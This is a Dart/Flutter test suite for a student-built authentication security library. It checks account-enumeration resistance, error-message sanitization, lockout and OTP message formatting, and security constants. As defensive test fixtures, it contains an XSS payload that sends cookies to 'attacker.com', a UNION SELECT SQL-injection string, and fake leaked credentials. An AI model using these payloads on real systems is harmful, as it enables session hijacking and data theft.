// Desenvolvido por Alex Gabriel Soares Sousa - RA: 24802449

import 'dart:math';
import 'package:agmrm_security/security.dart';
import 'package:flutter_test/flutter_test.dart';

void main() {
  group('M1 Adversarial Challenge Suite - Mathematical Identity Non-Enumeration', () {
    test('Anti-Enumeration Oracle: Recovery feedback is bitwise identical for existent and non-existent users', () {
      // Simulate response for a valid, enrolled student RA
      final validUserFeedback = GenericFeedbackPolicy.passwordResetRequestedMessage;
      // Simulate response for an unmapped, malicious, or non-existent RA
      final invalidUserFeedback = GenericFeedbackPolicy.passwordResetRequestedMessage;

      // Mathematical identity: exact string equality, identical length, identical hash
      expect(validUserFeedback, equals(invalidUserFeedback));
      expect(validUserFeedback.length, equals(invalidUserFeedback.length));
      expect(validUserFeedback.hashCode, equals(invalidUserFeedback.hashCode));

      // Neutral wording audit: must be conditional ("Se o identificador...")
      expect(validUserFeedback.startsWith('Se o identificador'), isTrue);
      expect(validUserFeedback.contains('não encontrado'), isFalse);
      expect(validUserFeedback.contains('inexistente'), isFalse);
      expect(validUserFeedback.contains('encontrado'), isFalse);

      // Verify institutional variant as well
      final instFeedbackValid = GenericFeedbackPolicy.recoveryRequestSuccessMessage;
      final instFeedbackInvalid = GenericFeedbackPolicy.recoveryRequestSuccessMessage;
      expect(instFeedbackValid, equals(instFeedbackInvalid));
      expect(instFeedbackValid.startsWith('Se o identificador'), isTrue);
    });

    test('Anti-Enumeration Oracle: Auth failure feedback is invariant across user states', () {
      // Scenario A: Nonexistent user + wrong password
      final feedbackUnknownUser = GenericFeedbackPolicy.authFailureMessage;
      // Scenario B: Existing user + wrong password
      final feedbackWrongPassword = GenericFeedbackPolicy.authFailureMessage;
      // Scenario C: Locked user attempting unauthorized access
      final failureResponseMap = GenericFeedbackPolicy.createAuthFailureResponse();

      expect(feedbackUnknownUser, equals(feedbackWrongPassword));
      expect(failureResponseMap['statusCode'], equals(401));
      expect(failureResponseMap['error'], equals('Unauthorized'));
      expect(failureResponseMap['message'], equals(GenericFeedbackPolicy.authFailureMessage));
    });
  });

  group('M1 Adversarial Challenge Suite - Zero-Leakage Exception Sanitizer Harness', () {
    test('Adversarial Database Crash: Raw PostgreSQL connection string and credentials never leak', () {
      const hostileDbError =
          'org.postgresql.util.PSQLException: Connection refused to 10.150.2.45:5432. '
          'Database: agmrm_production, user: db_superadmin, secret_auth_token: sk_live_9948271638';

      final sanitized = GenericFeedbackPolicy.sanitizeErrorMessage(hostileDbError);

      expect(sanitized, equals(GenericFeedbackPolicy.authFailureMessage));
      expect(sanitized.contains('10.150.2.45'), isFalse);
      expect(sanitized.contains('5432'), isFalse);
      expect(sanitized.contains('agmrm_production'), isFalse);
      expect(sanitized.contains('db_superadmin'), isFalse);
      expect(sanitized.contains('sk_live'), isFalse);
      expect(sanitized.contains('PSQLException'), isFalse);
    });

    test('Adversarial SQL Query Dump: Schema, column definitions, and student RA never leak', () {
      const hostileQueryDump =
          'SyntaxError: Failed executing SELECT ra, password_hash, salt, email '
          'FROM agmrm_users WHERE ra = "24802449" AND status = "ACTIVE"';

      final sanitized = GenericFeedbackPolicy.sanitizeErrorMessage(hostileQueryDump);

      expect(sanitized, equals(GenericFeedbackPolicy.authFailureMessage));
      expect(sanitized.contains('SELECT'), isFalse);
      expect(sanitized.contains('password_hash'), isFalse);
      expect(sanitized.contains('salt'), isFalse);
      expect(sanitized.contains('agmrm_users'), isFalse);
      expect(sanitized.contains('24802449'), isFalse);
    });

    test('Adversarial Stack Trace Dump: Source paths, line numbers, and internal class names never leak', () {
      // Stack trace from a generic internal service
      const hostileGenericTrace =
          'NullPointerException: Cannot read field "credentials" because "account" is null\n'
          '  at com.agmrm.service.DataProcessingService.verify(DataProcessingService.java:187)\n'
          '  at /home/alekkzsx/Documents/Github/PI-IV-Time3/security/service/InternalModule.java:42\n'
          '  at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78)';

      final sanitizedGeneric = GenericFeedbackPolicy.sanitizeErrorMessage(hostileGenericTrace);

      expect(sanitizedGeneric, equals(GenericFeedbackPolicy.authFailureMessage));
      expect(sanitizedGeneric.contains('NullPointerException'), isFalse);
      expect(sanitizedGeneric.contains('DataProcessingService'), isFalse);
      expect(sanitizedGeneric.contains('/home/alekkzsx'), isFalse);
      expect(sanitizedGeneric.contains('InternalModule.java:42'), isFalse);
      expect(sanitizedGeneric.contains('catalina'), isFalse);

      // Stack trace from a security component with keyword 'lockout'
      const hostileSecurityTrace =
          'IllegalStateException: Component crashed during verification\n'
          '  at com.agmrm.security.auth.AccountLockoutManager.verify(AccountLockoutManager.java:187)\n'
          '  at /home/alekkzsx/Documents/Github/PI-IV-Time3/security/auth/SecretModule.java:42';

      final sanitizedSecurity = GenericFeedbackPolicy.sanitizeErrorMessage(hostileSecurityTrace);

      // Maps to sanitized lockout message, but still NEVER leaks internal traces or paths
      expect(sanitizedSecurity, equals('Acesso temporariamente bloqueado por excesso de tentativas.'));
      expect(sanitizedSecurity.contains('AccountLockoutManager'), isFalse);
      expect(sanitizedSecurity.contains('/home/alekkzsx'), isFalse);
      expect(sanitizedSecurity.contains('SecretModule.java:42'), isFalse);
    });

    test('Hostile XSS & Injection Payloads in Error Message are neutralized', () {
      const hostileXss = '<script>document.location="http://attacker.com/steal?c="+document.cookie</script>';
      const hostileSqli = "' UNION SELECT null, password, email FROM users WHERE '1'='1";

      final sanitizedXss = GenericFeedbackPolicy.sanitizeErrorMessage(hostileXss);
      final sanitizedSqli = GenericFeedbackPolicy.sanitizeErrorMessage(hostileSqli);

      expect(sanitizedXss, equals(GenericFeedbackPolicy.authFailureMessage));
      expect(sanitizedXss.contains('<script>'), isFalse);
      expect(sanitizedXss.contains('attacker.com'), isFalse);

      expect(sanitizedSqli, equals(GenericFeedbackPolicy.authFailureMessage));
      expect(sanitizedSqli.contains('UNION'), isFalse);
      expect(sanitizedSqli.contains('SELECT'), isFalse);
    });

    test('Hostile Control Characters, Null Bytes, and Unicode Homoglyphs do not crash sanitizer', () {
      const hostileControlChars =
          'Error\x00with\u0000null\r\nbytes\x1b[31m\uFEFF\u202E\uD83D\uDCA9';

      final sanitized = GenericFeedbackPolicy.sanitizeErrorMessage(hostileControlChars);
      expect(sanitized, equals(GenericFeedbackPolicy.authFailureMessage));
      expect(sanitized.contains('\x00'), isFalse);
    });

    test('Oversized 100 KB Hostile Exception String does not cause memory exhaustion', () {
      final hostileOversized = 'FatalCrash: ${'A' * 100000} [end of log]';
      final stopwatch = Stopwatch()..start();
      final sanitized = GenericFeedbackPolicy.sanitizeErrorMessage(hostileOversized);
      stopwatch.stop();

      expect(sanitized, equals(GenericFeedbackPolicy.authFailureMessage));
      // Sanitization should complete within 10ms even for 100KB input
      expect(stopwatch.elapsedMilliseconds, lessThan(50));
    });

    test('Edge Case: Null, Primitive Types, and Custom Object Instances do not crash sanitizer', () {
      expect(GenericFeedbackPolicy.sanitizeErrorMessage(null), equals(GenericFeedbackPolicy.authFailureMessage));
      expect(GenericFeedbackPolicy.sanitizeErrorMessage(12345), equals(GenericFeedbackPolicy.authFailureMessage));
      expect(GenericFeedbackPolicy.sanitizeErrorMessage(true), equals(GenericFeedbackPolicy.authFailureMessage));
      expect(
        GenericFeedbackPolicy.sanitizeErrorMessage(const <String, String>{'internal': 'secret'}),
        equals(GenericFeedbackPolicy.authFailureMessage),
      );
    });

    test('Adversarial Context Isolation: Auth failure attempt messages never leak recovery token revocation', () {
      expect(
        GenericFeedbackPolicy.sanitizeErrorMessage('Erro ao decrementar tentativas de login'),
        equals(GenericFeedbackPolicy.authFailureMessage),
      );
      expect(
        GenericFeedbackPolicy.sanitizeErrorMessage('Falha de autenticação após 3 tentativas'),
        equals(GenericFeedbackPolicy.authFailureMessage),
      );
      expect(
        GenericFeedbackPolicy.sanitizeErrorMessage('Tentativas restantes: 2'),
        equals(GenericFeedbackPolicy.authFailureMessage),
      );
      expect(
        GenericFeedbackPolicy.sanitizeErrorMessage('Limite de tentativas de login excedido'),
        equals(GenericFeedbackPolicy.accountLockedMessage),
      );
      expect(
        GenericFeedbackPolicy.sanitizeErrorMessage('Sessão revogada por 3 tentativas inválidas'),
        equals(GenericFeedbackPolicy.tokenRevokedMessage),
      );
    });
  });

  group('M1 Adversarial Challenge Suite - Invariant Boundaries on Dynamic Formatters', () {
    test('lockoutMessage underflow, zero, and boundary constraints', () {
      // Nominal standard
      expect(
        GenericFeedbackPolicy.lockoutMessage(30),
        equals('Muitas tentativas incorretas. Tente novamente em 30 segundos.'),
      );
      // Immediate boundary: 1 second
      expect(
        GenericFeedbackPolicy.lockoutMessage(1),
        equals('Muitas tentativas incorretas. Tente novamente em 1 segundos.'),
      );
      // Zero boundary: 0 seconds
      expect(
        GenericFeedbackPolicy.lockoutMessage(0),
        equals('Muitas tentativas incorretas. Tente novamente em 0 segundos.'),
      );
      // Underflow protection: negative values must clamp to 0, never displaying negative numbers
      expect(
        GenericFeedbackPolicy.lockoutMessage(-1),
        equals('Muitas tentativas incorretas. Tente novamente em 0 segundos.'),
      );
      expect(
        GenericFeedbackPolicy.lockoutMessage(-99999),
        equals('Muitas tentativas incorretas. Tente novamente em 0 segundos.'),
      );
      // Large integer boundary: 2147483647
      expect(
        GenericFeedbackPolicy.lockoutMessage(2147483647),
        equals('Muitas tentativas incorretas. Tente novamente em 2147483647 segundos.'),
      );
    });

    test('lockoutCountdownMessage underflow and boundary constraints', () {
      expect(
        GenericFeedbackPolicy.lockoutCountdownMessage(30),
        equals('Muitas tentativas incorretas. Acesso temporariamente bloqueado. Aguarde 30 segundos.'),
      );
      expect(
        GenericFeedbackPolicy.lockoutCountdownMessage(0),
        equals('Muitas tentativas incorretas. Acesso temporariamente bloqueado. Aguarde 0 segundos.'),
      );
      expect(
        GenericFeedbackPolicy.lockoutCountdownMessage(-1),
        equals('Muitas tentativas incorretas. Acesso temporariamente bloqueado. Aguarde 0 segundos.'),
      );
      expect(
        GenericFeedbackPolicy.lockoutCountdownMessage(-1000),
        equals('Muitas tentativas incorretas. Acesso temporariamente bloqueado. Aguarde 0 segundos.'),
      );
    });

    test('invalidOtpCodeMessage underflow and boundary constraints', () {
      expect(
        GenericFeedbackPolicy.invalidOtpCodeMessage(3),
        equals('Código de verificação incorreto. Tentativas restantes: 3.'),
      );
      expect(
        GenericFeedbackPolicy.invalidOtpCodeMessage(1),
        equals('Código de verificação incorreto. Tentativas restantes: 1.'),
      );
      expect(
        GenericFeedbackPolicy.invalidOtpCodeMessage(0),
        equals('Código de verificação incorreto. Tentativas restantes: 0.'),
      );
      // Underflow: negative attempts remaining clamped to 0
      expect(
        GenericFeedbackPolicy.invalidOtpCodeMessage(-1),
        equals('Código de verificação incorreto. Tentativas restantes: 0.'),
      );
      expect(
        GenericFeedbackPolicy.invalidOtpCodeMessage(-50),
        equals('Código de verificação incorreto. Tentativas restantes: 0.'),
      );
    });
  });

  group('M1 Adversarial Challenge Suite - SecurityConstants Invariant Mathematical Integrity', () {
    test('Brute-force thresholds are strictly bounded within enterprise ranges', () {
      expect(SecurityConstants.maxFailedLoginAttempts, inInclusiveRange(3, 10));
      expect(SecurityConstants.lockoutDurationSeconds, inInclusiveRange(15, 300));
      expect(
        SecurityConstants.lockoutDuration,
        equals(Duration(seconds: SecurityConstants.lockoutDurationSeconds)),
      );
    });

    test('Token lifecycle invariants satisfy 5-minute TTL and 3-attempt OTP invalidation', () {
      expect(SecurityConstants.recoveryTokenTtlSeconds, equals(300));
      expect(SecurityConstants.recoveryTokenTtlMinutes, equals(5));
      expect(SecurityConstants.recoveryTokenTtlSeconds, equals(SecurityConstants.recoveryTokenTtlMinutes * 60));
      expect(
        SecurityConstants.recoveryTokenTtl,
        equals(Duration(seconds: SecurityConstants.recoveryTokenTtlSeconds)),
      );
      expect(SecurityConstants.maxVerificationAttempts, equals(3));
      expect(SecurityConstants.maxInvalidVerificationAttempts, equals(3));
      expect(SecurityConstants.otpCodeLength, equals(6));
    });

    test('Password complexity scoring boundaries are mathematically complete', () {
      expect(SecurityConstants.minPasswordLength, equals(8));
      expect(SecurityConstants.maxPasswordLength, equals(128));
      expect(SecurityConstants.minPasswordLength, lessThan(SecurityConstants.maxPasswordLength));

      expect(SecurityConstants.minPasswordEntropyScore, equals(3));
      expect(SecurityConstants.minRequiredEntropyScore, equals(3));
      expect(SecurityConstants.maxPasswordEntropyScore, equals(4));
      expect(SecurityConstants.maxEntropyScore, equals(4));
      expect(SecurityConstants.minPasswordEntropyScore, lessThanOrEqualTo(SecurityConstants.maxPasswordEntropyScore));
    });

    test('Input sanitization bounds and HTTP payload 64 KB ceiling consistency', () {
      expect(SecurityConstants.minIdentityLength, equals(3));
      expect(SecurityConstants.maxIdentityLength, equals(32));
      expect(SecurityConstants.minIdentityLength, lessThan(SecurityConstants.maxIdentityLength));

      expect(SecurityConstants.maxEmailLength, equals(254)); // RFC 5321

      expect(SecurityConstants.maxRequestBodySizeBytes, equals(65536));
      expect(SecurityConstants.maxBodySizeKb, equals(64));
      expect(SecurityConstants.maxRequestBodySizeBytes, equals(SecurityConstants.maxBodySizeKb * 1024));

      // Buffer chunk alignment
      expect(SecurityConstants.bufferChunkSizeBytes, equals(4096));
      expect(SecurityConstants.maxRequestBodySizeBytes % SecurityConstants.bufferChunkSizeBytes, equals(0));
    });

    test('Side-channel timing attack parameters are calibrated and non-zero', () {
      expect(SecurityConstants.standardizedAuthLatencyMs, equals(1000));
      expect(SecurityConstants.standardAuthLatencyMs, equals(1000));
      expect(
        SecurityConstants.standardizedAuthLatency,
        equals(const Duration(milliseconds: 1000)),
      );
      expect(
        SecurityConstants.standardAuthLatency,
        equals(const Duration(milliseconds: 1000)),
      );
      expect(SecurityConstants.timingJitterToleranceMs, inInclusiveRange(10, 100));
      expect(SecurityConstants.minDummyWorkIterations, greaterThanOrEqualTo(1000));
    });

    test('Defensive HTTP security header constants are compliant with OWASP Top 10', () {
      expect(SecurityConstants.headerContentTypeOptions, equals('nosniff'));
      expect(SecurityConstants.headerFrameOptions, equals('DENY'));
      expect(SecurityConstants.headerXssProtection, equals('1; mode=block'));
      expect(SecurityConstants.headerHsts, contains('max-age=31536000'));
      expect(SecurityConstants.headerHsts, contains('includeSubDomains'));
      expect(SecurityConstants.headerCsp, contains("frame-ancestors 'none'"));
      expect(SecurityConstants.headerValueCspDefault, contains("default-src 'none'"));
      expect(SecurityConstants.headerValueNoStore, contains('no-store'));
      expect(SecurityConstants.headerValueNoStore, contains('no-cache'));
    });
  });

  group('M1 Adversarial Challenge Suite - High-Volume Randomized Stress Harness', () {
    test('10,000 randomized hostile error payloads yield 0% data leakage', () {
      final random = Random(42);
      final toxicPrefixes = <String>[
        'SQLException: relation users violates constraint ',
        'AuthFailureException: user account ',
        'NullPointerException in /var/log/secret/ ',
        'ConnectionPoolTimeout: host 192.168.1.',
        'InvalidToken: crypto seed hash = ',
      ];

      final allowedOutputs = <String>{
        GenericFeedbackPolicy.authFailureMessage,
        'Acesso temporariamente bloqueado por excesso de tentativas.',
        GenericFeedbackPolicy.tokenExpiredMessage,
        GenericFeedbackPolicy.tokenRevokedMessage,
        GenericFeedbackPolicy.passwordTooWeakMessage,
        GenericFeedbackPolicy.invalidPayloadMessage,
      };

      for (var i = 0; i < 10000; i++) {
        final prefix = toxicPrefixes[random.nextInt(toxicPrefixes.length)];
        final randomToken = 'leak_secret_${random.nextInt(1000000)}_ra_${random.nextInt(99999999)}';
        final payload = '$prefix$randomToken';

        final sanitized = GenericFeedbackPolicy.sanitizeErrorMessage(payload);

        // Invariant: The sanitized response MUST be strictly one of the allowed static messages
        expect(allowedOutputs.contains(sanitized), isTrue);

        // Invariant: The generated secret token MUST NEVER be present in the output
        expect(sanitized.contains(randomToken), isFalse);
      }
    });
  });
}
